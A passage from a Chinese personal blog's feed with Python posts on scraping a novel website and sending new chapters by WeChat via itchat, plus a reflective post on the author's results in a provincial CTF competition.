    <content type="html"><![CDATA[<p>人生最痛苦的事莫过于小说断更！这篇文章将对这一问题给出一种Python+阿里云+微信的解决方法<br><a id="more"></a><br>不过世界总是需要懒人的，因为有了懒人创造世界。这话不是我说的，是马爸爸说的：</p><blockquote><p>懒不是傻懒，如果你想少干，就要想出懒的方法。要懒出风格，懒出境界。——马云</p></blockquote><p>为此我专门买了一台服务器（9.9还包邮哦），反正以后还有很多地方用到服务器。</p><p>扯远了。。。利用服务器可以干很多事，比如接下来的利用微信第三方python库实现小说更新时通过微信将更新内容发给指定朋友。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> time,itchat</span><br><span class="line"> <span class="comment"># 微信登录</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vxLogin</span><span class="params">(rename)</span>:</span></span><br><span class="line">    <span class="comment"># enableCmdQR：在命令行中显示登录二维码，参数2是Linux系统下的字符宽度</span></span><br><span class="line">    itchat.auto_login(hotReload=<span class="keyword">True</span>,enableCmdQR=<span class="number">2</span>)</span><br><span class="line">    friends = itchat.get_friends(update=<span class="keyword">True</span>)</span><br><span class="line">    <span class="keyword">for</span> friend <span class="keyword">in</span> reversed(friends):</span><br><span class="line">        <span class="keyword">if</span> friend[<span class="string">'RemarkName'</span>] == rename:</span><br><span class="line">            toName = friend[<span class="string">'UserName'</span>]</span><br><span class="line">            <span class="keyword">return</span> toName</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查更新</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(url,start,toName)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> requests,re</span><br><span class="line">    res = requests.get(url).content.decode(<span class="string">'gb18030'</span>)</span><br><span class="line">    lis = re.findall(<span class="string">r'&lt;li&gt;&lt;a href="(.*?)" title="(.*?)，.*?"&gt;'</span>,res)</span><br><span class="line">    toName = vxLogin(rename=toName)</span><br><span class="line">    <span class="keyword">for</span> li <span class="keyword">in</span> lis[start:]:</span><br><span class="line">        end_str = li[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            end = int(re.findall(<span class="string">r'第[ ]?(.*?)[ ]?章'</span>,end_str)[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            print(<span class="string">'[*]小说更新了，但是章节序号为中文，我暂时不想处理。。。'</span>) <span class="comment">#碰到这种情况再更新，懒</span></span><br><span class="line">            exit()</span><br><span class="line">        <span class="keyword">if</span> end &gt;= start+<span class="number">1</span>:</span><br><span class="line">            text = requests.get(li[<span class="number">0</span>]).content.decode(<span class="string">'gbk'</span>)</span><br><span class="line">            re_text = re.findall(<span class="string">r'&lt;/script&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;(.*?)&lt;script'</span>,text,re.S)[<span class="number">0</span>]</span><br><span class="line">            re_text = re_text.replace(<span class="string">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;'</span>,<span class="string">''</span>)</span><br><span class="line">            re_text = re_text.replace(<span class="string">'&lt;br /&gt;'</span>,<span class="string">''</span>)</span><br><span class="line">            re_text = re_text.replace(<span class="string">'\r\n\r\n'</span>,<span class="string">'\r\n'</span>)</span><br><span class="line">            re_text = <span class="string">'%s\n%s\n\n'</span> %(li[<span class="number">1</span>],re_text)</span><br><span class="line">            print(<span class="string">'更新：%s'</span> % li[<span class="number">1</span>])</span><br><span class="line">            text = <span class="string">'最近更新了第%s章\n%s'</span> % (end,re_text)</span><br><span class="line">            length = len(text)//<span class="number">3</span></span><br><span class="line">            <span class="comment"># 分3段发送</span></span><br><span class="line">            itchat.send(msg=text[:length], toUserName=toName)</span><br><span class="line">            itchat.send(msg=text[length:(length*<span class="number">2</span>)], toUserName=toName)</span><br><span class="line">            itchat.send(msg=text[(length*<span class="number">2</span>):], toUserName=toName)</span><br><span class="line">            time.sleep(<span class="number">5</span>)</span><br><span class="line">    print(<span class="string">'[*]更新完成！暂无最新章节'</span>)</span><br><span class="line">    <span class="comment"># 声明startNum为全局变量，这样就不会在这个函数内部新建变量</span></span><br><span class="line">    <span class="keyword">global</span> startNum</span><br><span class="line">    startNum = end</span><br><span class="line">    time.sleep(<span class="number">3600</span>)<span class="comment"># 1小时更新检查一次</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">'[*]Starting...'</span>)</span><br><span class="line">    <span class="comment"># 当前最新章节</span></span><br><span class="line">    startNum = <span class="number">410</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">       update(url=<span class="string">'http://www.quanshuwang.cn/book/137/137120'</span>,start=startNum,toName=<span class="string">'杰帅'</span>)<span class="comment"># toName为None时发给自己</span></span><br><span class="line">    <span class="comment"># 持续运行</span></span><br><span class="line">    itchat.run()</span><br></pre></td></tr></table></figure><p>这里的url<code>http://www.quanshuwang.cn/book/137/137120</code>是我看的<code>《一步偷天》</code>在全书网的网址</p><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><h3 id="服务器端："><a href="#服务器端：" class="headerlink" title="服务器端："></a>服务器端：</h3><p><img src="/2018/11/26/利用微信实现小说更新提醒/server.png" alt="服务器"></p><h3 id="微信端："><a href="#微信端：" class="headerlink" title="微信端："></a>微信端：</h3><p><img src="/2018/11/26/利用微信实现小说更新提醒/weixin.jpg" alt="微信"></p><p>小说也看完了，终于又可以开始写bug了！！</p><hr><p>另外，这个博客只作分享交流技术用，大爷们不用<strong>打赏</strong>，真的不用，真的不用，（疯狂暗示中…）</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;人生最痛苦的事莫过于小说断更！这篇文章将对这一问题给出一种Python+阿里云+微信的解决方法&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="https://blog.suqir.xyz/categories/Python/"/>
    
    
      <category term="python, &quot;爬虫&quot;" scheme="https://blog.suqir.xyz/tags/python-%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>爬取某书网指定小说</title>
    <link href="https://blog.suqir.xyz/2018/11/07/%E7%88%AC%E5%8F%96%E6%9F%90%E4%B9%A6%E7%BD%91%E6%8C%87%E5%AE%9A%E5%B0%8F%E8%AF%B4/"/>
    <id>https://blog.suqir.xyz/2018/11/07/%E7%88%AC%E5%8F%96%E6%9F%90%E4%B9%A6%E7%BD%91%E6%8C%87%E5%AE%9A%E5%B0%8F%E8%AF%B4/</id>
    <published>2018-11-07T08:11:11.000Z</published>
    <updated>2020-03-17T14:25:40.475Z</updated>
    
    <content type="html"><![CDATA[<p>初探Python - 用Python实现对小说的爬取并下载<br><a id="more"></a></p><h1 id="0x00-起因"><a href="#0x00-起因" class="headerlink" title="0x00 起因"></a>0x00 起因</h1><p>最近看了一部基于小说改编的电视剧，闲的无聊就去看了看小说。但是大多数看书网站都有或多或少的广告，强迫症表示很难受，加之近来正在学习Python，便想着利用Python爬取小说的内容，远离广告的‘宠信’。</p><h1 id="0x01-实现原理"><a href="#0x01-实现原理" class="headerlink" title="0x01 实现原理"></a>0x01 实现原理</h1><p>程序实现原理很简单，将用户输入的书名提交到全书网进行搜索，将返回的结果存在list中并展示给用户，对用户选择的书籍进行书籍内容的爬取，并写入文件。</p><h1 id="0x02-存在的问题"><a href="#0x02-存在的问题" class="headerlink" title="0x02 存在的问题"></a>0x02 存在的问题</h1><p>初次学习写这种爬虫，代码难免冗余难读，但关键部分均写有注释，在此分享出来以作交流。<br>在实际操作过程中也遇到不少问题，比如：如果所查询的书籍在全书网中只有唯一的一本，全书网将直接通过location进行重定向到书籍详情页，与多本书的处理方式不一致，所以为了完美的获取书记简介必须写个if判断；再如：用户提交的书名必须经过gb2312编码并转urlencoding后才能查询到，否则服务器返回错误。。。不过，也可能是我第一次写，有更好的处理方法，希望自己继续努力吧！</p><h1 id="0x03-源代码："><a href="#0x03-源代码：" class="headerlink" title="0x03 源代码："></a>0x03 源代码：</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests,sys,re</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bookspider</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""爬取全书网指定书籍并下载到本地"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        super(Bookspider, self).__init__()</span><br><span class="line">        self.request = requests.session()</span><br><span class="line">        self.headers = &#123;</span><br><span class="line">            <span class="comment">#随机指定user-agent</span></span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">'User-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">book_search</span><span class="params">(self,name)</span>:</span></span><br><span class="line">        print(<span class="string">'[*]搜索中...'</span>)</span><br><span class="line">        <span class="comment">#全书网的搜索url</span></span><br><span class="line">        <span class="comment">#对name进行url编码：urllib.request.quote</span></span><br><span class="line">        self.url = <span class="string">'http://www.quanshuwang.com/modules/article/search.php?searchkey='</span>+urllib.request.quote(name.encode(<span class="string">'gb2312'</span>))+<span class="string">'&amp;searchtype=articlename&amp;searchbuttom.x=88&amp;searchbuttom.y=22'</span></span><br><span class="line">        <span class="comment">#禁止重定向：allow_redirects=False</span></span><br><span class="line">        search_data = self.request.get(self.url,headers=self.headers,allow_redirects=<span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#所爬书籍唯一时被重定向到location</span></span><br><span class="line">            self.location = search_data.headers[<span class="string">'location'</span>]</span><br><span class="line">            <span class="comment">#将str的location转换成list，方便计算length</span></span><br><span class="line">            self.location = self.location.split()</span><br><span class="line">        <span class="keyword">except</span> KeyError <span class="keyword">as</span> e:</span><br><span class="line">            response = search_data.content.decode(<span class="string">'gbk'</span>)</span><br><span class="line">            <span class="comment">#所爬书籍有多种结果时，返回所有书籍信息</span></span><br><span class="line">            self.location = re.findall(<span class="string">r'&lt;li&gt;&lt;a target="_blank" href="(.*?)".*?title="(.*?)".*&gt;(.*?)&lt;/a&gt;&lt;em class=.*?&gt;(.*?)&lt;a href='</span>,response)</span><br><span class="line">        <span class="keyword">return</span> self.location</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">book_info</span><span class="params">(self)</span>:</span></span><br><span class="line">        res = requests.get(self.location,headers=self.headers).content.decode(<span class="string">'gbk'</span>)</span><br><span class="line">        <span class="comment">#正则匹配书名</span></span><br><span class="line">        self.bookname = re.findall(<span class="string">r'&lt;meta property="og:title" content="(.*?)"/&gt;'</span>,res)[<span class="number">0</span>]</span><br><span class="line">        <span class="comment">#正则匹配书籍作者</span></span><br><span class="line">        self.author = re.findall(<span class="string">r'&lt;meta property="og:novel:author" content="(.*?)"/&gt;'</span>,res)[<span class="number">0</span>]</span><br><span class="line">        <span class="comment">#正则匹配书记简介  re.S指定多行匹配</span></span><br><span class="line">        self.description = re.findall(<span class="string">r'&lt;meta property="og:description" content="(.*?)"/&gt;'</span>,res,re.S)[<span class="number">0</span>].replace(<span class="string">'&amp;nbsp;'</span>,<span class="string">''</span>).replace(<span class="string">'&lt;br /&gt;'</span>,<span class="string">''</span>).replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">        <span class="comment">#正则匹配书籍目录</span></span><br><span class="line">        self.booklink = re.findall(<span class="string">r'class="leftso png_bg"&gt;&lt;a href="(.*?)"'</span>,res)[<span class="number">0</span>]</span><br><span class="line">        response = requests.get(self.booklink,headers=self.headers).content.decode(<span class="string">'gbk'</span>)</span><br><span class="line">        <span class="comment">#正则匹配所有章节及其链接</span></span><br><span class="line">        self.contents = re.findall(<span class="string">r'&lt;li&gt;&lt;a href="(.*?)" title="(.*?)"&gt;.*?&lt;/a&gt;&lt;/li&gt;'</span>,response)</span><br><span class="line">        <span class="comment">#总章数</span></span><br><span class="line">        self.len = len(self.contents)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save</span><span class="params">(self)</span>:</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#开始写入文件</span></span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'%s.txt'</span>%self.bookname,<span class="string">'w'</span>,encoding=<span class="string">'utf-8'</span>,errors=<span class="string">'ignore'</span>) <span class="keyword">as</span> text_save:</span><br><span class="line">            text_save.write(self.bookname+<span class="string">'\n作者：'</span>+self.author)</span><br><span class="line">            text_save.write(<span class="string">'\n简介：'</span>+self.description)</span><br><span class="line">            text_save.write(<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">for</span> num <span class="keyword">in</span> self.contents:</span><br><span class="line">                <span class="comment">#获取单章文本</span></span><br><span class="line">                text_r = requests.get(num[<span class="number">0</span>],headers=self.headers)</span><br><span class="line">                text_c = text_r.content</span><br><span class="line">                text = text_c.decode(<span class="string">'gbk'</span>)</span><br><span class="line">                <span class="comment">#获取章节名</span></span><br><span class="line">                title = num[<span class="number">1</span>].replace(re.findall(<span class="string">r'，共\d*字'</span>,num[<span class="number">1</span>])[<span class="number">0</span>],<span class="string">''</span>)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="comment">#正则匹配内容</span></span><br><span class="line">                    text = re.findall(<span class="string">r'&lt;/script&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;(.*?)&lt;script type="text/javascript"&gt;'</span>,text,re.S)[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">except</span> IndexError <span class="keyword">as</span> e:</span><br><span class="line">                    print(<span class="string">'【**】%s下载失败'</span>%title)</span><br><span class="line">                <span class="comment">#数据清洗</span></span><br><span class="line">                text = text.replace(<span class="string">'&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;'</span>,<span class="string">''</span>)</span><br><span class="line">                text = text.replace(<span class="string">'&lt;br /&gt;'</span>,<span class="string">''</span>)</span><br><span class="line">                text = text.replace(<span class="string">'\r\n\r\n'</span>,<span class="string">'\r\n'</span>)</span><br><span class="line"></span><br><span class="line">                text_save.write(<span class="string">'\n'</span>)</span><br><span class="line">                text_save.write(title)</span><br><span class="line">                text_save.write(<span class="string">'\n\n'</span>)</span><br><span class="line">                text_save.write(text)</span><br><span class="line">                text_save.write(<span class="string">'\n'</span>)</span><br><span class="line">                print(<span class="string">'[*]%-30s\t完成度%.3f%%'</span>%(title,(i+<span class="number">1</span>) * <span class="number">100</span> / self.len))</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            text_save.write(<span class="string">'\n===全书完===\n==by苏乞儿==\n'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_item</span><span class="params">(self)</span>:</span></span><br><span class="line">        item =  len(self.location)</span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set_location</span><span class="params">(self,location)</span>:</span></span><br><span class="line">        self.location = location</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_bookname</span><span class="params">(self)</span>:</span></span><br><span class="line">            <span class="keyword">return</span> self.bookname</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_author</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.author</span><br><span class="line"></span><br><span class="line">    <span class="comment">#获取总章数</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_chapter</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.len</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_description</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.description</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    book = Bookspider()</span><br><span class="line">    name = input(<span class="string">'[*]请输入书名：'</span>)</span><br><span class="line">    <span class="comment">#查书</span></span><br><span class="line">    locations = book.book_search(name)</span><br><span class="line">    item_sum = book.get_item()</span><br><span class="line">    <span class="comment">#以下为两种搜索结果的处理，1.所爬的书籍在全书网是唯一的，2.所爬的书籍在全书网有多本</span></span><br><span class="line">    <span class="keyword">if</span> item_sum == <span class="number">1</span>:</span><br><span class="line">        book.set_location(locations[<span class="number">0</span>])</span><br><span class="line">        book.book_info()</span><br><span class="line">        print(<span class="string">'[*]%s共%d条搜索结果：\n'</span>%(name,item_sum))</span><br><span class="line">        print(<span class="string">'#'</span>*<span class="number">150</span>)</span><br><span class="line">        print(<span class="string">'[*]书名：%s'</span>%book.get_bookname())</span><br><span class="line">        print(<span class="string">'[*]作者：%s'</span>%book.get_author())</span><br><span class="line">        print(<span class="string">'[*]简介：%s'</span>%book.get_description())</span><br><span class="line">        print(<span class="string">'#'</span>*<span class="number">150</span>)</span><br><span class="line">        choose1 = input(<span class="string">'[*]是否继续下载？(y/n)'</span>)</span><br><span class="line">        <span class="keyword">if</span> choose1 == <span class="string">'y'</span> <span class="keyword">or</span> choose1 == <span class="string">'Y'</span>:</span><br><span class="line">            print(<span class="string">'\n[*]正在下载《%s》'</span>%book.get_bookname())</span><br><span class="line">            <span class="comment">#保存文本</span></span><br><span class="line">            book.save()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\n[*]感谢使用！'</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        print(<span class="string">'[*]%s共%d条搜索结果：\n'</span>%(name,item_sum))</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> locations:</span><br><span class="line">            print(<span class="string">'#'</span>*<span class="number">150</span>)</span><br><span class="line">            print(<span class="string">'[*]序号：%d'</span>%(j+<span class="number">1</span>))</span><br><span class="line">            print(<span class="string">'[*]书名：%s'</span>%item[<span class="number">1</span>])</span><br><span class="line">            print(<span class="string">'[*]作者：%s'</span>%item[<span class="number">2</span>])</span><br><span class="line">            print(<span class="string">'[*]简介：%s'</span>%item[<span class="number">3</span>])</span><br><span class="line">            print(<span class="string">'#'</span>*<span class="number">150</span>)</span><br><span class="line">            j +=<span class="number">1</span></span><br><span class="line">        choose2 = int(input(<span class="string">'\n\n请选择序号：'</span>))</span><br><span class="line">        <span class="keyword">if</span> choose2 &gt;= <span class="number">1</span> <span class="keyword">and</span> choose2 &lt;= item_sum:</span><br><span class="line">            print(<span class="string">'\n[*]正在下载《%s》'</span>%locations[choose2<span class="number">-1</span>][<span class="number">1</span>])</span><br><span class="line">            <span class="comment">#设置书籍链接地址</span></span><br><span class="line">            book.set_location(locations[choose2<span class="number">-1</span>][<span class="number">0</span>])</span><br><span class="line">            book.book_info()</span><br><span class="line">            <span class="comment">#保存文本</span></span><br><span class="line">            book.save()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'\n[*]感谢使用！'</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'\n[*]下载成功！'</span>)</span><br></pre></td></tr></table></figure><h1 id="0x04-部分运行截图："><a href="#0x04-部分运行截图：" class="headerlink" title="0x04 部分运行截图："></a>0x04 部分运行截图：</h1><p><img src="/2018/11/07/爬取某书网指定小说/start.png" alt="开始"></p><p><img src="/2018/11/07/爬取某书网指定小说/select.png" alt="选择"></p><p><img src="/2018/11/07/爬取某书网指定小说/ing.png" alt="运行中"></p><h1 id="0x05-下载的文本文件："><a href="#0x05-下载的文本文件：" class="headerlink" title="0x05 下载的文本文件："></a>0x05 下载的文本文件：</h1><p><img src="/2018/11/07/爬取某书网指定小说/wb.png" alt="文本"></p><h1 id="0x06-更新（2018年11月26日）"><a href="#0x06-更新（2018年11月26日）" class="headerlink" title="0x06 更新（2018年11月26日）"></a>0x06 更新（2018年11月26日）</h1><p>后期使用过程发现还有不少bug，不过毕竟算第一篇爬虫，这边就不删除了，留个纪念吧！较完善的服务器版本在这里：<a href="https://blog.suqir.xyz/2018/12/15/%E7%88%AC%E5%8F%96%E6%9F%90%E4%B9%A6%E7%BD%91%E6%8C%87%E5%AE%9A%E5%B0%8F%E8%AF%B4-%E5%BE%AE%E4%BF%A1%E7%89%88/#more">爬取某书网指定小说-微信版</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;初探Python - 用Python实现对小说的爬取并下载&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="https://blog.suqir.xyz/categories/Python/"/>
    
    
      <category term="python,&quot;爬虫&quot;" scheme="https://blog.suqir.xyz/tags/python-%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>记一次CTF大赛的感受</title>
    <link href="https://blog.suqir.xyz/2018/10/29/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E5%A4%A7%E8%B5%9B%E7%9A%84%E6%84%9F%E5%8F%97/"/>
    <id>https://blog.suqir.xyz/2018/10/29/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E5%A4%A7%E8%B5%9B%E7%9A%84%E6%84%9F%E5%8F%97/</id>
    <published>2018-10-29T08:44:10.000Z</published>
    <updated>2020-03-17T14:14:36.839Z</updated>
    
    <content type="html"><![CDATA[<p>对山东省网络技术大赛的参赛体会和总结</p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>10月27号的山东省网络技术大赛是我大学参加过的第一个比赛，在这个比赛中我和各大高校的大佬们共同在网络攻防CTF夺旗赛这一命题中进行角逐。其实在去之前我的心里是没有多少信心的（事实证明我的担心是有必要的），同时寄希望于其他选手水平也差不多，我也只看过一些基础的web方向的解题方法，只看过几篇关于隐写的题，因为在我看来这种比赛应该不会涉及到密码，逆向，溢出和隐写等等这几类题，然而。。。</p><p>先分享一下我比赛最后的排名情况：</p><p><img src="/2018/10/29/记一次CTF大赛的感受/wlkjds_ctf.png" alt="image"></p><p>我的成绩在里面不是特别理想，在39名选手中排在第11位，得分仅331，与前三名一千多的得分更是有着不小的差距（小声哔哔：前三是来自警察学院的未来的网警），但究其根本还是自己在网络安全这一领域还有很长的路要走。</p><p>下面是在这次比赛中我得到的一些经验和教训，特地分享出来，一来警示自己，二来以作交流。另外，我会在后面把所有题做一遍并写一篇write up(如果官方还没有关闭训练场)</p><h1 id="0x01-不足"><a href="#0x01-不足" class="headerlink" title="0x01 不足"></a>0x01 不足</h1><ol><li>过分自信，轻视对手</li><li>解题时心静不下来，导致做题时没有深入，往往错过很多会做的题</li><li>没有设立明确的目标，导致会的题因为较其他选手稍晚得到flag，得分较低；不会的题又没有尝试去解</li><li>在网络安全领域坐井观天，没有保持一颗学习的心态</li></ol><h1 id="0x02-受益"><a href="#0x02-受益" class="headerlink" title="0x02 受益"></a>0x02 受益</h1><ol><li>心中始终坚信：学无止境</li><li>积累了大赛经验，后续参加此类比赛不至于手忙脚乱</li><li>坚守自己的底线</li></ol><h1 id="0x03-展望"><a href="#0x03-展望" class="headerlink" title="0x03 展望"></a>0x03 展望</h1><p>在经历了此次比赛后，虽然没有取得满意的成绩，但也更加坚定了对未来继续扩展学习方向的信心。接下来的近一年时间，我将根据时间安排准备下一届的网络安全大赛，同时进行PHP、Python等语言的学习，争取将各个CTF大赛的题看一遍write up或自己试解，希望能在下一届的比赛中获得一个令自己比较满意的成绩。</p><p><strong>人生没有退路，只有不停地选择！</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;对山东省网络技术大赛的参赛体会和总结&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透" scheme="https://blog.suqir.xyz/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="CTF, &quot;旅行&quot;" scheme="https://blog.suqir.xyz/tags/CTF-%E6%97%85%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>CTF</title>
    <link href="https://blog.suqir.xyz/2018/10/12/CTF/"/>
    <id>https://blog.suqir.xyz/2018/10/12/CTF/</id>
    <published>2018-10-12T09:52:11.000Z</published>
    <updated>2020-03-17T14:15:05.639Z</updated>
    
